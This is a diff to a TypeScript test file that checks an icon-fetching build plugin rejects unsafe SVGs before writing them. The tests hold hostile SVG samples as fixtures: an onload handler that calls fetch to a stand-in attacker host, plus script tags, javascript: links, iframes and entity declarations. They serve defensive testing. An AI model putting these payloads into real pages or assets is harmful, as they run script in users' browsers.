@@ -4,14 +4,19 @@ import { expect, test } from "bun:test"
 import { mkdtemp, mkdir, readFile, readdir, rm } from "node:fs/promises"
 import { tmpdir } from "node:os"
 import { join } from "node:path"
-import { fetchProviderIcons, providerIconFilename, providerIconsPlugin } from "./provider-icons"
+import {
+  assertSafeProviderIcon,
+  fetchProviderIcons,
+  providerIconFilename,
+  providerIconsPlugin,
+} from "./provider-icons"
 
 const SVG = '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg>'
 
 async function withCatalog(
   catalog: unknown,
   run: (fixture: { url: string; output: string; requests: string[] }) => Promise<void>,
-  options: { catalogStatus?: number; iconStatus?: number } = {},
+  options: { catalogStatus?: number; iconStatus?: number; icons?: Record<string, string> } = {},
 ) {
   const directory = await mkdtemp(join(tmpdir(), "unifia-provider-icons-"))
   const output = join(directory, "icons")
@@ -24,7 +29,7 @@ async function withCatalog(
       const pathname = new URL(request.url).pathname
       requests.push(pathname)
       if (pathname === "/api.json") return Response.json(catalog, { status: options.catalogStatus ?? 200 })
-      return new Response(SVG, { status: options.iconStatus ?? 200 })
+      return new Response(options.icons?.[pathname] ?? SVG, { status: options.iconStatus ?? 200 })
     },
   })
   try {
@@ -89,4 +94,31 @@ test("failed catalog and icon responses are reported instead of written as asset
     await expect(fetchProviderIcons(url, output)).rejects.toThrow("Provider icon request failed: 503")
     expect(await readdir(output)).toEqual([])
   }, { iconStatus: 503 })
+})
+
+test("one icon with active content aborts the batch before any file is written", async () => {
+  const hostile = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'//evil.example\')"><path d="M0 0"/></svg>'
+  await withCatalog({ valid: {}, hostile: {} }, async ({ url, output }) => {
+    await expect(fetchProviderIcons(url, output)).rejects.toThrow("Provider icon is not a plain SVG document")
+    expect(await readdir(output)).toEqual([])
+  }, { icons: { "/logos/hostile.svg": hostile } })
+})
+
+test("the icon gate rejects active content, external documents and non-SVG roots", () => {
+  const rejected = [
+    '<svg><script>alert(1)</script></svg>',
+    '<svg><foreignObject><div/></foreignObject></svg>',
+    '<svg><iframe src="https://evil.example"/></svg>',
+    '<svg><object data="payload.swf"/></svg>',
+    '<svg onload="alert(1)"></svg>',
+    '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>',
+    '<!DOCTYPE svg [<!ENTITY e "x">]><svg/>',
+    "<html><body/></html>",
+    '<svg><path d="M0 0"/>',
+  ]
+  for (const svg of rejected) {
+    expect(() => assertSafeProviderIcon("acme", svg)).toThrow("Provider icon is not a plain SVG document")
+  }
+  expect(() => assertSafeProviderIcon("acme", SVG)).not.toThrow()
+  expect(() => assertSafeProviderIcon("acme", `<?xml version="1.0"?>\n<!-- logo -->\n${SVG}\n`)).not.toThrow()
 })
